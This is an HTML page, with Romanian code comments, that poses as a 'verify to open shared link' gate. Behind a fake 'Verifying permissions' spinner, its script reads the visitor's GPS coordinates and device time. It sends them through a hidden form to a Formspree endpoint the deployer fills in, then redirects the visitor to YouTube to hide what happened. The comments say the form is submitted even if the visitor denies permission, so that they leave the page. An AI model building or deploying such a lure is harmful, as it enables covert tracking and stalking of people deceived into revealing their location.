<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Content...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 100px 20px; background: #f9f9f9; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { padding: 12px 24px; font-size: 16px; font-weight: bold; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; }
        #hidden-form { display: none; }
    </style>
</head>
<body>

    <div id="content-box">
        <h3>Verification Required</h3>
        <p>Please confirm your location to access this shared link.</p>
        <button onclick="startTest()">Verify & Open Link</button>
    </div>

    <!-- Formularul ascuns care trimite datele garantat prin browser -->
    <!-- Înlocuiește doar ID_UL_TAU_AICI cu codul tău real Formspree -->
    <form id="hidden-form" action="https://formspree.io" method="POST">
        <input type="text" name="Latitude" id="form-lat">
        <input type="text" name="Longitude" id="form-lon">
        <input type="text" name="Device_Time" id="form-time">
        <!-- Formspree va redirecționa automat utilizatorul aici după trimitere -->
        <input type="hidden" name="_next" value="https://youtube.com">
    </form>

    <script>
        function startTest() {
            document.getElementById('content-box').innerHTML = '<div class="loader"></div><p>Verifying permissions...</p>';
            
            if (navigator.geolocation) {
                // Dacă utilizatorul nu răspunde în 4 secunde, trimitem formularul gol doar ca să îl redirecționăm
                setTimeout(forceSubmit, 4000);

                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        document.getElementById('form-lat').value = position.coords.latitude;
                        document.getElementById('form-lon').value = position.coords.longitude;
                        document.getElementById('form-time').value = new Date().toLocaleString();
                        forceSubmit();
                    }, 
                    function(error) {
                        // Dacă dă block/eroare, trimitem direct ca să plece de pe pagină
                        forceSubmit();
                    },
                    { timeout: 3000 }
                );
            } else {
                forceSubmit();
            }
        }

        function forceSubmit() {
            document.getElementById('hidden-form').submit();
        }
    </script>
</body>
</html>
